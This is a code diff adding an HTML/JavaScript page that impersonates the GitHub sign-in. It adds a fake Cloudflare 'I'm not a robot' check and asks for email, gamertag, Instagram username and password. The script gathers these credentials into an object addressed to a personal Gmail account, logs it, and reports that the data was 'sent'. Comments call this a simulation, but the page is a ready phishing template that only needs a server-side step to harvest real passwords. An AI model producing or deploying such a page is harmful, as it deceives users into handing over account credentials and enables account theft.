@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub - Authentication</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background-color: #161b22;
+            border-radius: 12px;
+            padding: 24px;
+            width: 100%;
+            max-width: 340px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+            border: 1px solid #21262d;
+        }
+        
+        .github-logo {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #f0f6fc;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        
+        .github-logo i {
+            font-size: 32px;
+            margin-right: 8px;
+            color: #fff;
+        }
+        
+        .form-title {
+            font-size: 20px;
+            text-align: center;
+            margin-bottom: 16px;
+            color: #f0f6fc;
+            font-weight: 300;
+        }
+        
+        .form-step {
+            display: none;
+        }
+        
+        .active {
+            display: block;
+        }
+        
+        .input-group {
+            margin-bottom: 16px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            color: #c9d1d9;
+            font-size: 14px;
+            transition: all 0.2s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1f6feb;
+            box-shadow: 0 0 0 3px rgba(31, 111, 235, 0.3);
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #238636;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-top: 8px;
+        }
+        
+        button:hover {
+            background-color: #2ea043;
+        }
+        
+        .secondary-btn {
+            background-color: #21262d;
+        }
+        
+        .secondary-btn:hover {
+            background-color: #30363d;
+            border-color: #8b949e;
+        }
+        
+        .step-indicator {
+            text-align: center;
+            font-size: 13px;
+            color: #8b949e;
+            margin-bottom: 16px;
+        }
+        
+        .cloudflare-verification {
+            background-color: #1c2128;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+            text-align: center;
+            border: 1px solid #30363d;
+        }
+        
+        .cloudflare-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 12px;
+            color: #ff9d00;
+        }
+        
+        .cloudflare-header i {
+            font-size: 20px;
+            margin-right: 8px;
+        }
+        
+        .cloudflare-header h3 {
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        .verification-text {
+            font-size: 13px;
+            margin-bottom: 12px;
+            color: #8b949e;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 12px 0;
+        }
+        
+        .checkbox-container input {
+            width: auto;
+            margin-right: 8px;
+        }
+        
+        .success-message {
+            background-color: rgba(35, 134, 54, 0.1);
+            border: 1px solid rgba(35, 134, 54, 0.4);
+            border-radius: 6px;
+            padding: 12px;
+            margin-top: 16px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .success-message i {
+            color: #3fb950;
+            margin-right: 8px;
+        }
+        
+        .links {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 13px;
+        }
+        
+        .links a {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: #30363d;
+            margin: 20px 0;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease forwards;
+        }
+        
+        .email-notice {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 16px;
+            text-align: center;
+        }
+        
+        .password-strength {
+            height: 5px;
+            background-color: #21262d;
+            border-radius: 3px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        
+        .strength-meter {
+            height: 100%;
+            width: 0;
+            transition: width 0.3s ease;
+        }
+        
+        .weak {
+            background-color: #f85149;
+            width: 33%;
+        }
+        
+        .medium {
+            background-color: #d29922;
+            width: 66%;
+        }
+        
+        .strong {
+            background-color: #3fb950;
+            width: 100%;
+        }
+        
+        .password-requirements {
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="github-logo">
+            <i class="fab fa-github"></i> GitHub
+        </div>
+        
+        <div class="form-step active" id="step1">
+            <h2 class="form-title">Sign in to GitHub</h2>
+            <div class="step-indicator">Step 1 of 2</div>
+            
+            <div class="input-group">
+                <label for="email">Email address</label>
+                <input type="email" id="email" placeholder="Enter your email" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label for="gamertag">Gamertag</label>
+                <input type="text" id="gamertag" placeholder="Enter your gamertag" autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label for="instagram">Instagram username</label>
+                <input type="text" id="instagram" placeholder="Enter your Instagram username" autocomplete="off">
+            </div>
+            
+            <button onclick="showCloudflareVerification()">Continue</button>
+            
+            <div class="email-notice">
+                Verification will be sent to jagmohandhaker@gmail.com
+            </div>
+            
+            <div class="links">
+                <a href="#">Create an account</a> · <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        
+        <div class="form-step" id="step2">
+            <h2 class="form-title">Verify your identity</h2>
+            <div class="step-indicator">Step 2 of 2</div>
+            
+            <div class="cloudflare-verification">
+                <div class="cloudflare-header">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>Cloudflare Security Check</h3>
+                </div>
+                <p class="verification-text">Verify you are human to continue</p>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="human-verification">
+                    <label for="human-verification">I'm not a robot</label>
+                </div>
+                <button class="secondary-btn" onclick="verifyHuman()">Verify</button>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password" autocomplete="off" onkeyup="checkPasswordStrength()">
+                <div class="password-strength">
+                    <div class="strength-meter" id="password-strength-meter"></div>
+                </div>
+                <div class="password-requirements">
+                    Use at least 8 characters with a mix of letters, numbers & symbols
+                </div>
+            </div>
+            
+            <button onclick="sendDataToEmail()">Sign in</button>
+            
+            <button class="secondary-btn" onclick="goBackToStep1()">Back</button>
+            
+            <div class="email-notice">
+                Data will be sent to jagmohandhaker@gmail.com
+            </div>
+        </div>
+        
+        <div class="success-message" id="success-message">
+            <i class="fas fa-check-circle"></i> Data sent to jagmohandhaker@gmail.com successfully!
+        </div>
+        
+        <div class="divider"></div>
+        
+        <div class="links">
+            <a href="#">Terms</a> · <a href="#">Privacy</a> · <a href="#">Docs</a> · <a href="#">Contact</a>
+        </div>
+    </div>
+
+    <script>
+        function showCloudflareVerification() {
+            // Basic validation
+            const email = document.getElementById('email').value;
+            const gamertag = document.getElementById('gamertag').value;
+            const instagram = document.getElementById('instagram').value;
+            
+            if (!email || !gamertag || !instagram) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            // Validate email format
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                alert('Please enter a valid email address');
+                return;
+            }
+            
+            // Hide step 1 and show step 2 with Cloudflare verification
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('step2').classList.add('fade-in');
+        }
+        
+        function verifyHuman() {
+            const verificationCheckbox = document.getElementById('human-verification');
+            if (verificationCheckbox.checked) {
+                alert('Verification successful! You can now proceed to login.');
+            } else {
+                alert('Please verify that you are not a robot.');
+            }
+        }
+        
+        function checkPasswordStrength() {
+            const password = document.getElementById('password').value;
+            const strengthMeter = document.getElementById('password-strength-meter');
+            
+            // Reset strength meter
+            strengthMeter.className = 'strength-meter';
+            
+            if (password.length === 0) {
+                return;
+            }
+            
+            // Calculate password strength
+            let strength = 0;
+            
+            // Length check
+            if (password.length > 7) strength += 1;
+            
+            // Contains both lower and uppercase characters
+            if (password.match(/([a-z].*[A-Z])|([A-Z].*[a-z])/)) strength += 1;
+            
+            // Contains numbers
+            if (password.match(/([0-9])/)) strength += 1;
+            
+            // Contains special characters
+            if (password.match(/([!,@,#,$,%,^,&,*,?,_,~])/)) strength += 1;
+            
+            // Update strength meter
+            if (strength < 2) {
+                strengthMeter.classList.add('weak');
+            } else if (strength === 2 || strength === 3) {
+                strengthMeter.classList.add('medium');
+            } else {
+                strengthMeter.classList.add('strong');
+            }
+        }
+        
+        function sendDataToEmail() {
+            const email = document.getElementById('email').value;
+            const gamertag = document.getElementById('gamertag').value;
+            const instagram = document.getElementById('instagram').value;
+            const password = document.getElementById('password').value;
+            const isHumanVerified = document.getElementById('human-verification').checked;
+            
+            if (!password) {
+                alert('Please enter your password');
+                return;
+            }
+            
+            if (password.length < 8) {
+                alert('Password must be at least 8 characters long');
+                return;
+            }
+            
+            if (!isHumanVerified) {
+                alert('Please complete the Cloudflare verification');
+                return;
+            }
+            
+            // Show success message
+            const successMessage = document.getElementById('success-message');
+            successMessage.style.display = 'block';
+            
+            // In a real application, you would send this data to a server
+            // which would then email it to jagmohandhaker@gmail.com
+            // This is a simulation of that process
+            
+            // Display the data that would be sent (for demo purposes)
+            const dataToSend = {
+                email: email,
+                gamertag: gamertag,
+                instagram: instagram,
+                password: password,
+                timestamp: new Date().toLocaleString()
+            };
+            
+            console.log("Data that would be sent to jagmohandhaker@gmail.com:", dataToSend);
+            
+            // Simulate sending data
+            setTimeout(() => {
+                alert('Data has been sent to jagmohandhaker@gmail.com!\n\nIn a real application, this would be sent via server-side processing.');
+                resetForm();
+            }, 2000);
+        }
+        
+        function goBackToStep1() {
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('success-message').style.display = 'none';
+        }
+        
+        function resetForm() {
+            document.getElementById('email').value = '';
+            document.getElementById('gamertag').value = '';
+            document.getElementById('instagram').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('human-verification').checked = false;
+            document.getElementById('success-message').style.display = 'none';
+            document.getElementById('password-strength-meter').className = 'strength-meter';
+            goBackToStep1();
+        }
+    </script>
+</body>
+</html> 
